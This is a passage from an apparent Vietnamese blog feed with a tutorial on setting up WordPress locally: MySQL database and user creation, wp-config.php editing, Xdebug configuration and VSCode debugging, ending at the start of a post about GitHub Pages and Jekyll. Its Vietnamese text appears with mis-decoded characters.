1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;WordPress c·∫ßn m·ªôt c∆° s·ªü d·ªØ li·ªáu (MySQL/MariaDB) ƒë·ªÉ l∆∞u:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;B√†i vi·∫øt, trang, menu&lt;/li&gt;&#xA;&lt;li&gt;Ng∆∞·ªùi d√πng, m·∫≠t kh·∫©u (hash)&lt;/li&gt;&#xA;&lt;li&gt;C·∫•u h√¨nh site&lt;/li&gt;&#xA;&lt;li&gt;Plugins, themes settings&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;M·ªü MySQL v·ªõi quy·ªÅn root&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo mysql -u root&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;C·∫•u h√¨nh MySQL&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;-- T·∫°o database wordpress &#xA;mysql&amp;gt; CREATE DATABASE wordpress;&#xA;Query OK, 1 row affected (0,00 sec)&#xA;&#xA;-- T·∫°o user ri√™ng cho wordpress&#xA;mysql&amp;gt; CREATE USER wordpress@localhost IDENTIFIED BY &amp;#39;&amp;lt;your-password&amp;gt;&amp;#39;;&#xA;Query OK, 1 row affected (0,00 sec)&#xA;&#xA;-- C·∫•p quy·ªÅn cho user WordPress&#xA;mysql&amp;gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost;&#xA;Query OK, 1 row affected (0,00 sec)&#xA;&#xA;-- L√†m m·ªõi l·∫°i quy·ªÅn&#xA;mysql&amp;gt; FLUSH PRIVILEGES;&#xA;Query OK, 1 row affected (0,00 sec)&#xA;&#xA;-- Tho√°t&#xA;mysql&amp;gt; quit&#xA;Bye&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Kh·ªüi ƒë·ªông l·∫°i d·ªãch v·ª•&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo service mysql start&lt;/code&gt;&lt;/pre&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;configure-wordpress-to-connect-to-the-database&#34;&gt;&lt;span&gt;Configure WordPress to connect to the database&lt;/span&gt;&#xA;  &lt;a href=&#34;#configure-wordpress-to-connect-to-the-database&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;Copy file c·∫•u h√¨nh m·∫´u&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;WordPress khi t·∫£i v·ªÅ c√≥ s·∫µn file wp-config-sample.php&lt;/li&gt;&#xA;&lt;li&gt;B·∫°n copy n√≥ th√†nh wp-config.php ƒë·ªÉ l√†m file c·∫•u h√¨nh ch√≠nh cho site&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;Ch·ªânh s·ª≠a th√¥ng tin database&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo -u www-data sed -i &amp;#39;s/database_name_here/wordpress/&amp;#39; /srv/www/wordpress/wp-config.php&#xA;sudo -u www-data sed -i &amp;#39;s/username_here/wordpress/&amp;#39; /srv/www/wordpress/wp-config.php&#xA;sudo -u www-data sed -i &amp;#39;s/password_here/&amp;lt;your-password&amp;gt;/&amp;#39; /srv/www/wordpress/wp-config.php&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;ƒê√¢y l√† 3 d√≤ng thay th·∫ø text trong file &lt;code&gt;wp-config.php&lt;/code&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;database_name_here&lt;/code&gt; =&amp;gt; &lt;code&gt;wordpress&lt;/code&gt; (t√™n DB ƒë√£ t·∫°o ·ªü b∆∞·ªõc tr∆∞·ªõc)&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;username_here&lt;/code&gt; =&amp;gt; &lt;code&gt;wordpress&lt;/code&gt; (user MySQL ƒë√£ t·∫°o)&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;password_here&lt;/code&gt; =&amp;gt; &lt;code&gt;&amp;lt;your-password&amp;gt;&lt;/code&gt; (password ƒë√£ set)&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;Khi Apache ch·∫°y WordPress, n√≥ s·∫Ω ƒë·ªçc file n√†y ƒë·ªÉ bi·∫øt d√πng user n√†o + DB n√†o ƒë·ªÉ k·∫øt n·ªëi MySQL&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;Th√™m Secret Keys v√† Salts&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo -u www-data nano /srv/www/wordpress/wp-config.php&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;üëâ ƒê√¢y l√† chu·ªói b√≠ m·∫≠t m√† WordPress d√πng ƒë·ªÉ:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;M√£ h√≥a session cookies&lt;/li&gt;&#xA;&lt;li&gt;Sinh ra token (nonce) ch·ªëng CSRF&lt;/li&gt;&#xA;&lt;li&gt;NgƒÉn ch·∫∑n t·∫•n c√¥ng ki·ªÉu ‚Äúknown secret‚Äù (v√≠ d·ª• k·∫ª t·∫•n c√¥ng ƒëo√°n ƒë∆∞·ª£c secret m·∫∑c ƒë·ªãnh ƒë·ªÉ gi·∫£ m·∫°o login)&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;define( &amp;#39;AUTH_KEY&amp;#39;,         &amp;#39;put your unique phrase here&amp;#39; );&#xA;define( &amp;#39;SECURE_AUTH_KEY&amp;#39;,  &amp;#39;put your unique phrase here&amp;#39; );&#xA;define( &amp;#39;LOGGED_IN_KEY&amp;#39;,    &amp;#39;put your unique phrase here&amp;#39; );&#xA;define( &amp;#39;NONCE_KEY&amp;#39;,        &amp;#39;put your unique phrase here&amp;#39; );&#xA;define( &amp;#39;AUTH_SALT&amp;#39;,        &amp;#39;put your unique phrase here&amp;#39; );&#xA;define( &amp;#39;SECURE_AUTH_SALT&amp;#39;, &amp;#39;put your unique phrase here&amp;#39; );&#xA;define( &amp;#39;LOGGED_IN_SALT&amp;#39;,   &amp;#39;put your unique phrase here&amp;#39; );&#xA;define( &amp;#39;NONCE_SALT&amp;#39;,       &amp;#39;put your unique phrase here&amp;#39; );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Thay ƒë·ªïi n√≥ b·∫±ng c√°c chu·ªói random sau: &lt;a href=&#34;https://api.wordpress.org/secret-key/1.1/salt/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://api.wordpress.org/secret-key/1.1/salt/&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;configure-wordpress&#34;&gt;&lt;span&gt;Configure WordPress&lt;/span&gt;&#xA;  &lt;a href=&#34;#configure-wordpress&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;Truy c·∫≠p &lt;a href=&#34;http://localhost&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;http://localhost&lt;/a&gt;, ƒë·∫∑t &lt;strong&gt;site title&lt;/strong&gt;, &lt;strong&gt;username&lt;/strong&gt;, &lt;strong&gt;password&lt;/strong&gt;, &lt;strong&gt;email&lt;/strong&gt; cho user &lt;code&gt;admin&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#39;https://ubuntucommunity.s3.us-east-2.amazonaws.com/original/2X/e/ebe4d6066e0c32f14beca85ffd53e5915a4ab278.png&#39; alt=&#34;Configure WordPress&#34;&gt;&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;setup-debug-on-vscode&#34;&gt;&lt;span&gt;Setup Debug on VSCode&lt;/span&gt;&#xA;  &lt;a href=&#34;#setup-debug-on-vscode&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;ƒê·ªÉ hi·ªÉu ƒë∆∞·ª£c lu·ªìng c·ªßa trang web ch·∫°y v√† x·ª≠ l√≠ ·ªü m·ªói request, ta c·∫ßn ph·∫£i debug n√≥.&lt;/p&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;add-php-debug-extension-on-vs-code&#34;&gt;&lt;span&gt;Add PHP Debug extension on VS Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#add-php-debug-extension-on-vs-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;V√†o &lt;strong&gt;Extensions (Ctrl+Shift+X)&lt;/strong&gt; =&amp;gt; t√¨m &lt;strong&gt;PHP Debug (by Felix Becker)&lt;/strong&gt; =&amp;gt; &lt;strong&gt;Install&lt;/strong&gt;.&#xA;Extension n√†y k·∫øt n·ªëi v·ªõi &lt;strong&gt;Xdebug&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;install-xdebug-on-ubuntu&#34;&gt;&lt;span&gt;Install Xdebug on Ubuntu&lt;/span&gt;&#xA;  &lt;a href=&#34;#install-xdebug-on-ubuntu&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;pre&gt;&lt;code&gt;sudo apt install php-xdebug -y&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ki·ªÉm tra c√†i ch∆∞a:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;php -v&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;N·∫øu c√≥ d√≤ng &lt;code&gt;with Xdebug v3.x.x&lt;/code&gt; nghƒ©a l√† ƒë√£ OK.&lt;/p&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;configure-xdebug&#34;&gt;&lt;span&gt;Configure Xdebug&lt;/span&gt;&#xA;  &lt;a href=&#34;#configure-xdebug&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;pre&gt;&lt;code&gt;sudo nano /etc/php/&amp;lt;version&amp;gt;/apache2/php.ini&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Th√™m v√†o cu·ªëi file&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;zend_extension=xdebug.so&#xA;xdebug.mode=debug&#xA;xdebug.start_with_request=yes&#xA;xdebug.client_host=127.0.0.1&#xA;xdebug.client_port=9003&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Port m·∫∑c ƒë·ªãnh m·ªõi c·ªßa Xdebug v3 l√† &lt;strong&gt;9003&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Sau ƒë√≥ restart Apache:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo systemctl restart apache2&lt;/code&gt;&lt;/pre&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;configure-vscode-launchjson&#34;&gt;&lt;span&gt;Configure VSCode &lt;code&gt;launch.json&lt;/code&gt;&lt;/span&gt;&#xA;  &lt;a href=&#34;#configure-vscode-launchjson&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;M·ªü th∆∞ m·ª•c ch·ª©a trang web wordpress b·∫±ng VSCode&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;code /srv/www/wordpress&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong &lt;strong&gt;VS Code&lt;/strong&gt; =&amp;gt; &lt;strong&gt;Run and Debug (Ctrl+Shift+D)&lt;/strong&gt; =&amp;gt; t·∫°o file &lt;code&gt;launch.json&lt;/code&gt; v·ªõi n·ªôi dung:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;version&amp;#34;: &amp;#34;0.2.0&amp;#34;,&#xA;  &amp;#34;configurations&amp;#34;: [&#xA;    {&#xA;      &amp;#34;name&amp;#34;: &amp;#34;Listen for Xdebug&amp;#34;,&#xA;      &amp;#34;type&amp;#34;: &amp;#34;php&amp;#34;,&#xA;      &amp;#34;request&amp;#34;: &amp;#34;launch&amp;#34;,&#xA;      &amp;#34;port&amp;#34;: 9003,&#xA;      &amp;#34;pathMappings&amp;#34;: {&#xA;        &amp;#34;/srv/www/wordpress&amp;#34;: &amp;#34;${workspaceFolder}&amp;#34;&#xA;      }&#xA;    }&#xA;  ]&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;pathMappings&lt;/code&gt;: √°nh x·∫° th∆∞ m·ª•c trong &lt;strong&gt;container/server&lt;/strong&gt; (&lt;code&gt;/srv/www/wordpress&lt;/code&gt;) v·ªÅ th∆∞ m·ª•c &lt;strong&gt;local&lt;/strong&gt; c·ªßa trong VS Code.&lt;/p&gt;&#xA;&lt;p&gt;Nh∆∞ v·∫≠y l√† ƒë√£ ho√†n th√†nh setup WordPress tr√™n local k·∫øt h·ª£p Debug n√≥ tr√™n VSCode.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;extend&#34;&gt;&lt;span&gt;Extend&lt;/span&gt;&#xA;  &lt;a href=&#34;#extend&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;required-version&#34;&gt;&lt;span&gt;Required Version&lt;/span&gt;&#xA;  &lt;a href=&#34;#required-version&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;M·ªói phi√™n b·∫£n WordPress th∆∞·ªùng ƒëi k√®m 1 phi√™n b·∫£n PHP th√≠ch h·ª£p. N√™n ki·ªÉm tra t√≠nh t∆∞∆°ng th√≠ch n√†y ƒë·ªÉ qu√° tr√¨nh setup kh√¥ng b·ªã l·ªói.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;wordpress-auto-update&#34;&gt;&lt;span&gt;WordPress Auto Update&lt;/span&gt;&#xA;  &lt;a href=&#34;#wordpress-auto-update&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;T·ª´ WordPress &lt;strong&gt;3.7 tr·ªü ƒëi&lt;/strong&gt; (2013), WordPress c√≥ c∆° ch·∫ø t·ª± ƒë·ªông c·∫≠p nh·∫≠t (&lt;strong&gt;automatic background updates&lt;/strong&gt;) cho:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;B·∫£n v√° b·∫£o m·∫≠t (security release).&lt;/li&gt;&#xA;&lt;li&gt;B·∫£n b·∫£o tr√¨ (maintenance release).&lt;/li&gt;&#xA;&lt;li&gt;Kh√¥ng t·ª± ƒë·ªông update major version (tr·ª´ khi b·∫≠t r√µ r√†ng).&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;H·ªá th·ªëng ki·ªÉm tra v·ªõi server &lt;strong&gt;api.wordpress.org&lt;/strong&gt; ƒë·ªÉ xem c√≥ b·∫£n v√° n√†o m·ªõi s·∫Ω t·ª± ƒë·ªông n√¢ng c·∫•p background l√™n. Vi·ªác n√†y di·ªÖn ra r·∫•t nhanh sau khi setup, n√™n b·∫°n th·∫•y code ƒë·ªïi kh√°c so v·ªõi source g·ªëc.&lt;/p&gt;&#xA;&lt;p&gt;Qu√° tr√¨nh setup di·ªÖn ra khi truy c·∫≠p &lt;strong&gt;/wp-admin/install.php&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;ƒê·ªÉ v√¥ hi·ªáu h√≥a c∆° ch·∫ø c·∫≠p nh·∫≠t t·ª± ƒë·ªông n√†y, th√™m d√≤ng sau v√†o &lt;code&gt;wp-config.php&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;define( &amp;#39;WP_AUTO_UPDATE_CORE&amp;#39;, false );&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>Github Pages with Jekyll themes and Giscus</title>
      <link>http://localhost:1313/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/</link>
      <pubDate>Tue, 19 Aug 2025 01:10:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/</guid>
      <category domain="http://localhost:1313/vi/categories/web/">Web</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;Khi b·∫Øt ƒë·∫ßu t·∫°o blog c√° nh√¢n, c√≥ ba c√¥ng c·ª• b·∫°n c·∫ßn bi·∫øt: GitHub Pages, Jekyll v√† Giscus.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Github Pages&lt;/strong&gt;: D·ªãch v·ª• mi·ªÖn ph√≠ t·ª´ GitHub, cho ph√©p b·∫°n tri·ªÉn khai website tƒ©nh tr·ª±c ti·∫øp t·ª´ repository. Ch·ªâ c·∫ßn push code l√™n GitHub, blog c·ªßa b·∫°n s·∫Ω t·ª± ƒë·ªông xu·∫•t hi·ªán tr√™n Internet m√† kh√¥ng c·∫ßn server ri√™ng.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Jekyll&lt;/strong&gt;: M·ªôt static site generator t√≠ch 